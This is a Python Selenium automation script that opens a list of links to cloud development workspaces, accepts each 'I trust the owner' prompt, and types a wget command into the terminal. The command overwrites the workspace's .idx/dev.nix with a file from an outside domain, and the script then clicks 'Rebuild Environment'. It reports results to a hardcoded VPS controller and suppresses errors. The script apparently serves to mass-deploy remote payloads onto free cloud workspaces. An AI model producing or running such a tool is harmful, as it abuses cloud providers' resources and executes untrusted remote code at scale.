from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import time
import os
from datetime import datetime
import sys
import requests
import uuid
import json

# Configuration
SLEEP_SEBELUM_AKSI = 80
SLEEP_SESUDAH_AKSI = 5
SLEEP_JIKA_ERROR = 10
VPS_ENDPOINT = "http://47.84.61.131:5000"  # Change to your VPS IP
RDP_ID = str(uuid.uuid4())  # Unique identifier for this RDP
MAX_RETRIES = 3  # Max retries for VPS communication

def silent_excepthook(*args, **kwargs):
    pass

sys.excepthook = silent_excepthook

def get_options(user_data_dir, profile_dir):
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory={profile_dir}")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-session-crashed-bubble")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-features=InfiniteSessionRestore")
    options.add_argument("--window-size=500,500")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option("prefs", {
        "profile.default_content_setting_values.notifications": 2,
        "credentials_enable_service": False,
        "profile.password_manager_enabled": False
    })
    return options

def register_with_vps(profile_name):
    """Register this RDP with the central VPS"""
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f"{VPS_ENDPOINT}/register_rdp",
                json={
                    "rdp_id": RDP_ID,
                    "profile_name": profile_name
                },
                timeout=10
            )
            if response.status_code == 200:
                return response.json().get('total_rdps', 1)
        except Exception as e:
            print(f"Registration attempt {attempt + 1} failed: {e}")
            time.sleep(5)
    return 1  # Default to 1 if registration fails

def read_links_from_file(path):
    if not os.path.exists(path):
        return []
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def find_and_click_rebuild(driver):
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        for i, iframe in enumerate(iframes):
            driver.switch_to.frame(iframe)
            try:
                rebuild_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
                )
                if "Rebuild Environment" in rebuild_btn.text:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", rebuild_btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", rebuild_btn)
                    return True
            except TimeoutException:
                pass
            finally:
                driver.switch_to.default_content()
        return False
    except Exception:
        driver.switch_to.default_content()
        return False

def open_terminal_and_run(driver):
    try:
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(2)

        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        commands = [
            'wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
        ]
        for cmd in commands:
            actions = ActionChains(driver)
            for char in cmd:
                actions.send_keys(char)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(2)

            actions = ActionChains(driver)
            actions.send_keys(Keys.ENTER)
            actions.perform()
            time.sleep(3)

        find_and_click_rebuild(driver)
        return False
    except Exception:
        return False

def process_single_link(driver, link):
    try:
        driver.get(link)
        wait = WebDriverWait(driver, 20)
        try:
            trust = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
            trust.click()
            time.sleep(2)
            return True
        except Exception:
            return False
    except Exception:
        time.sleep(SLEEP_JIKA_ERROR)
        return False

def send_results_to_vps(success_links, failed_links, profile_name):
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                f"{VPS_ENDPOINT}/submit_results",
                json={
                    "rdp_id": RDP_ID,
                    "profile_name": profile_name,
                    "success_links": success_links,
                    "failed_links": failed_links,
                    "timestamp": datetime.now().isoformat()
                },
                timeout=15
            )
            if response.status_code == 200:
                print(f"Successfully sent {len(success_links)} success and {len(failed_links)} failed links to VPS")
                return True
        except Exception as e:
            print(f"Attempt {attempt + 1} failed to send results: {e}")
            time.sleep(5)
    return False

def worker(profile_name, user_data_dir, profile_dir, window_position, links):
    if not links:
        return
    
    # Register with VPS first
    total_rdps = register_with_vps(profile_name)
    print(f"Registered with VPS. Total RDPs expected: {total_rdps}")
    
    sys.stderr = open('nul', 'w')
    options = get_options(user_data_dir, profile_dir)
    driver = webdriver.Chrome(options=options)

    if window_position:
        driver.set_window_position(*window_position)

    success_links = []
    failed_links = []

    for link in links:
        try:
            trust_success = process_single_link(driver, link)
            if trust_success:
                success_links.append(link)
                try:
                    open_ws = WebDriverWait(driver, 20).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
                    open_ws.click()
                    time.sleep(2)
                    
                    time.sleep(SLEEP_SEBELUM_AKSI)
                    open_terminal_and_run(driver)
                    time.sleep(SLEEP_SESUDAH_AKSI)
                except Exception as e:
                    print(f"Error processing successful link {link}: {e}")
                    failed_links.append(link)
            else:
                failed_links.append(link)
                
            # Close all tabs except the first one
            if len(driver.window_handles) > 1:
                for handle in driver.window_handles[1:]:
                    driver.switch_to.window(handle)
                    driver.close()
                driver.switch_to.window(driver.window_handles[0])
                
        except Exception as e:
            print(f"Error processing link {link}: {e}")
            failed_links.append(link)
            try:
                # Try to recover the driver
                driver.quit()
                time.sleep(5)
                driver = webdriver.Chrome(options=options)
                if window_position:
                    driver.set_window_position(*window_position)
            except Exception as e:
                print(f"Failed to recover driver: {e}")
                # If we can't recover, break and try to send results
                break

    # Send results to central VPS
    if not send_results_to_vps(success_links, failed_links, profile_name):
        print("Failed to send results to VPS after multiple attempts")
    
    try:
        driver.quit()
    except:
        pass
    print(f"Worker {profile_name} completed processing")

if __name__ == "__main__":
    user_profiles = [
        {
            "name": "Profile1",
            "user_data_dir": r"C:\Users\Administrator\Desktop\Profile1",
            "profile_dir": "Default",
            "window_position": (0, 0)
        },
    ]

    all_links = read_links_from_file("link.txt")
    if not all_links:
        print("No links found in link.txt")
        exit(1)

    # Process each profile sequentially
    for profile in user_profiles:
        # Process all links in a single profile (no splitting)
        worker(
            profile['name'],
            profile['user_data_dir'],
            profile['profile_dir'],
            profile['window_position'],
            all_links
        )

    print("All workers completed processing")
